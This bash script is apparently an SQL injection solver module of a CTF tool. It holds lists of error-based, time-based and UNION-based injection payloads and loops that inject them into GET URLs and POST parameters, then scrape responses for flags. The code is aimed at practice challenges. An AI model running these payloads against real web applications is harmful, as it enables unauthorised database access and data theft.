#!/usr/bin/env bash
# Web SQL injection solver for pwnMyCTF

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
LIB_DIR="${SCRIPT_DIR}/../lib"

source "${LIB_DIR}/http.sh" 2>/dev/null || true
source "${LIB_DIR}/encoding.sh" 2>/dev/null || true

# Common SQL injection payloads
SQLI_ERROR_PAYLOADS=(
    "'"
    "\""
    "'--"
    "\"--"
    "';"
    "' /*"
    "')"
    "')--"
    "') /*"
)

SQLI_TIME_PAYLOADS=(
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    "'; SELECT SLEEP(5)--"
    "'; WAITFOR DELAY '00:00:05'--"
)

SQLI_UNION_PAYLOADS=(
    "' UNION SELECT NULL--"
    "' UNION SELECT NULL,NULL--"
    "' UNION SELECT NULL,NULL,NULL--"
    "' UNION SELECT NULL,NULL,NULL,NULL--"
    "' UNION SELECT @@version,NULL,NULL--"
    "' UNION SELECT user(),NULL,NULL--"
)

# Web SQL solver functions
solve_web_sql() {
    local target="$1"
    local verbose="${2:-0}"
    
    log_verbose 2 "Attempting SQL injection solve on: $target"
    
    # First, test if the target is vulnerable to basic error-based SQLi
    for payload in "${SQLI_ERROR_PAYLOADS[@]}"; do
        local test_url="${target}${payload}"
        local response
        if response=$(http_get "$test_url" 2>/dev/null); then
            # Check for common SQL error messages
            if echo "$response" | grep -qi "sql\|syntax\|mysql\|ora\-\|postgresql\|sqlite\|odbc\|jdbc"; then
                log_verbose 2 "Found potential SQLi with error-based payload: $payload"
                # Try to extract flag from error message or response
                local flag
                if flag=$(echo "$response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                    echo "$flag"
                    return 0
                fi
            fi
        fi
    done
    
    # Try UNION-based injection to extract data
    for payload in "${SQLI_UNION_PAYLOADS[@]}"; do
        local test_url="${target}${payload}"
        local response
        if response=$(http_get "$test_url" 2>/dev/null); then
            # Look for flags in UNION response
            local flag
            if flag=$(echo "$response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                echo "$flag"
                return 0
            fi
        fi
    done
    
    # Note: Time-based detection would require timing logic which is complex in bash
    # For simplicity, we'll rely on error-based and UNION-based detection
    
    return 1
}

# Also test with POST data
solve_web_sql_post() {
    local target="$1"
    local post_data="$2"
    local verbose="${3:-0}"
    
    log_verbose 2 "Attempting SQL injection POST solve on: $target"
    
    # Parse POST data to inject into each parameter
    local params=()
    IFS='&' read -ra ADDR <<< "$post_data"
    for pair in "${ADDR[@]}"; do
        params+=("$pair")
    done
    
    # For each parameter, try SQLi payloads
    for payload in "${SQLI_ERROR_PAYLOADS[@]}"; do
        for i in "${!params[@]}"; do
            local original="${params[$i]}"
            params[$i]="${original}${payload}"
            
            # Build new POST data
            local new_post=""
            for j in "${!params[@]}"; do
                if [[ $j -gt 0 ]]; then
                    new_post+="&"
                fi
                new_post+="${params[$j]}"
            done
            
            local response
            if response=$(http_post "$target" "$new_post" 2>/dev/null); then
                # Check for SQL errors
                if echo "$response" | grep -qi "sql\|syntax\|mysql\|ora\-\|postgresql\|sqlite\|odbc\|jdbc"; then
                    log_verbose 2 "Found potential SQLi in POST with payload: $payload"
                    local flag
                    if flag=$(echo "$response" | grep -Eo 'flag\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}' | head -1); then
                        echo "$flag"
                        return 0
                    fi
                fi
                
                # Restore original parameter
                params[$i]="$original"
            fi
        done
    done
    
    return 1
}

# Export functions
export -f solve_web_sql
export -f solve_web_sql_post